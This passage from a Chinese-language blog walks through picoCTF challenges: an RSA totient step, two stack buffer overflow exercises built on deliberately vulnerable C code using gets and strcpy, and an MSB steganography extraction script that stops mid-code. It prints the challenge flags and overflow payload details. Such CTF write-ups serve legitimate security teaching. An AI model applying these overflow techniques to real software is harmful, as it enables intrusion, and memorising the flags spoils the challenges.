<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><mrow><msub><mi>k</mi><mn>1</mn></msub><mo>−</mo><mn>1</mn></mrow></msubsup><mo>×</mo><mo stretchy="false">(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><msubsup><mi>p</mi><mn>2</mn><mrow><msub><mi>k</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn></mrow></msubsup><mo>×</mo><mo stretchy="false">(</mo><msub><mi>p</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo>⋯</mo><mo>×</mo><msubsup><mi>p</mi><mi>m</mi><mrow><msub><mi>k</mi><mi>m</mi></msub><mo>−</mo><mn>1</mn></mrow></msubsup><mo>×</mo><mo stretchy="false">(</mo><msub><mi>p</mi><mi>m</mi></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n) = p_1^{k_1 - 1} \times (p_1 - 1) \times p_2^{k_2 - 1} \times (p_2 - 1) \times \cdots \times p_m^{k_m - 1} \times (p_m - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1973em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1973em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0961em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p>
<p>這樣求出來 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 後就可以用正常計算流程找到明文 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;too_many_fact0rs_8606199&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Pwn-Binary-Exploitation">Pwn (Binary Exploitation)</h1>
<h2 id="Local-Target">Local Target</h2>
<p>這題給了一個可執行的檔案和 C 語言的代碼，先來分析一下他的代碼吧。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *fptr;</span><br><span class="line">  <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> input[<span class="number">16</span>];</span><br><span class="line">  <span class="type">int</span> num = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(input);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;num is %d\n&quot;</span>, num);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (num == <span class="number">65</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You win!\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="comment">// Open file</span></span><br><span class="line">    fptr = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fptr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Cannot open file.\n&quot;</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read contents from file</span></span><br><span class="line">    c = fgetc(fptr);</span><br><span class="line">    <span class="keyword">while</span> (c != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">      c = fgetc(fptr);</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fclose(fptr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>當使用 Netcat 連線到題目的時候，會如同下面一般。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701161031231.png" alt="題目"></p>
<p><strong>分析代碼</strong></p>
<ol>
<li><code>char input[16];</code>宣告了一個長度為 16 的字元陣列，儲存使用者輸入。</li>
<li><code>gets(input);</code>獲取使用者輸入，由於<code>gets</code>函數不檢查輸入的長度，使用者可以輸入超過 16 個字元。（<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40907279/article/details/89046366">危险函数 gets()几种完美的替代方法 你可能还不知道的</a>）</li>
<li><code>int num = 64;</code>宣告並初始化變數<code>num</code>。</li>
<li>拿到 flag 的條件是要讓 num 的值為 65。</li>
</ol>
<p>這邊我們可以用<code>man gets</code>指令進入 gets 的 man 手冊頁，看一下他的 bug 區塊，了解 gets 到底危險在哪裡。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702142351553.png" alt="Bug of gets function"></p>
<p><strong>BOF 攻擊</strong></p>
<p>首先，先檢查一下他有沒有任何保護機制。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701171059944.png" alt="Checksec from pwntools"></p>
<p>他沒有 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/">Canary</a> 也沒有 <a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10336777">PIE</a>，就正常做 BOF 就可以了。</p>
<p>因為<code>input</code>和<code>num</code>都是區域變數，所以會存在 Stack 中。並且因為是先宣告<code>input</code>緊接著宣告<code>num</code>，所以在 Stack 中會像下面這樣：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">High Address</span><br><span class="line">|</span><br><span class="line">|---------------------|</span><br><span class="line">|  Return Address     | &lt;-- top</span><br><span class="line">|---------------------|</span><br><span class="line">|  Frame Pointer      |</span><br><span class="line">|---------------------|</span><br><span class="line">|  int num            | &lt;-- 4 Bytes</span><br><span class="line">|---------------------|</span><br><span class="line">|  char input[16]     | &lt;-- 16 Bytes</span><br><span class="line">|---------------------|</span><br><span class="line">|</span><br><span class="line">Low Address</span><br></pre></td></tr></table></figure>
<p>最後試出來的 Payload 是 24 個字元加上一個大寫的 A（因為<code>ord(A) == 65</code>），但是在這裡我有點不理解為甚麼前面是 24 個填充，猜測是<code>input[16]</code>跟<code>num</code>中間有 Padding 之類的東西。如果有人知道的話再麻煩跟我解釋一下，感謝了！總之，還是拿到 Flag 啦。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704141242017.png" alt="Flag"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;l0c4l5_1n_5c0p3_fee8ef05&#125;</span><br></pre></td></tr></table></figure>
<h2 id="buffer-overflow-0">buffer overflow 0</h2>
<p>這題也是給了可執行文件和源代碼，先下載下來看看。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);  <span class="comment">// 這裡會print出flag</span></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">16</span>];  <span class="comment">// 這裡是關鍵。函數的名稱vuln代表著vulnerability</span></span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">           <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(flag, FLAGSIZE_MAX, f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler); <span class="comment">// Set up signal handler 當運行時出現Signal: SIGSEGV (Segmentation fault)時會調用sigsegv_handler函數</span></span><br><span class="line"></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">100</span>];</span><br><span class="line">  gets(buf1);</span><br><span class="line">  vuln(buf1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The program will exit now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分析代碼</strong></p>
<ol>
<li>Winning condition 是要觸發 Segmentation fault。</li>
<li><code>vuln</code>函式裡面的<code>buf2</code>宣告為 16 個字元的大小，也就是 16 個 Bytes。</li>
<li>當<code>gets</code>輸入的內容超過 16 個 Bytes 的時候，觸發錯誤。</li>
</ol>
<p>這邊我們可以再來看一下除了<code>gets</code>以外的危險函式，也就是<code>strcpy</code>。（<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/202358/buffer-overflow-example-strcpy">Buffer Overflow example - strcpy</a>）</p>
<p>man 手冊裡面也寫了，程式設計師要負起責任，指派一個足夠大的空間給 strcpy 的 dst（Destination）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702145932067.png" alt="Manual page for strcpy"></p>
<p><strong>BOF 攻擊</strong></p>
<p>所以我們知道，在這裡只要輸入很長的字串，就會造成<code>strcpy</code>出錯，並得到 flag，那就來試試看吧！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702150413588.png" alt="Flag"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;ov3rfl0ws_ar3nt_that_bad_9f2364bc&#125;</span><br></pre></td></tr></table></figure>
<h2 id="buffer-overflow-1">buffer overflow 1</h2>
<p>老樣子，一個 ELF 檔案，一個源碼。</p>
<h1 id="Forensics">Forensics</h1>
<h2 id="MSB">MSB</h2>
<p>看這個題目名稱，然後又出現在 Forensics，應該是跟隱寫術有關了。如果你還不知道 LSB 和 MSB 都是個啥，可以先去看看 <a href="https://cx330.tw/Notebooks/Cryptography-Notebook-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/">Cryptography Notes 密碼學任督二脈</a>，裡面有解釋了甚麼是 LSB 和 MSB。</p>
<p>題目的題幹說，This image passes LSB statistical analysis。那相反的，它其實就是在暗示 flag 可能藏在 RGB 像素值的 MSB 中，所以就來提取它每個像素中的的 MSB 吧。這邊用到了 Python 中的 Pillow 這個庫，如果覺得太麻煩，也可以直接用這個現成的工具 <a target="_blank" rel="noopener" href="https://github.com/zardus/ctf-tools/tree/master/stegsolve">Stegsolve</a>。</p>
<p>Exploit 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_msb</span>(<span class="params">image_path</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    pixels = image.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 獲取圖片尺寸</span></span><br><span class="line">    width, height = image.size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化儲存提取自MSB的字串</span></span><br><span class="line">    msb_data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取每個像素的MSB</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            r, g, b = pixels[x, y]</span><br><span class="line">            <span class="comment"># AND運算只保留了r, g, b的最高位，後面清零，再右移7位</span></span><br><span class="line">            msb_data += <span class="built_in">str</span>((r &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line">            msb_data += <span class="built_in">str</span>((g &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line">            msb_data += <span class="built_in">str</span>((b &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 將提取的MSB每8個位元轉換成字元</span></span><br><span class="line">    hidden_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msb_data), <span class="number">8</span>):</span><br><span class="line">        byte = msb_data[i : i + <span class="number">8</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte) == <span class="number">8</span>:</span><br><span class="line">            hidden_text += <span class="built_in">chr</span>(<span class="built_in">int</span>(byte, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hidden_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pico_ctf</span>(<span class="params">data</span>):</span><br><span class="line">    pattern = <span class="string">r&quot;picoCTF\&#123;.*?\&#125;&quot;</span></span><br><span class="line">    matches = re.findall(pattern, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> matches:</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;<span class="keyword">match</span>&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No matches found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    image_path = (</span><br><span class="line">        <span class="string">&quot;MSB/Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png&quot;</span>  <span class="comment"># 替換為你的路徑</span></span><br><span class="line">    )</span><br><span class="line">    hidden_message = extract_msb(image_path)</span><br><span class="line">    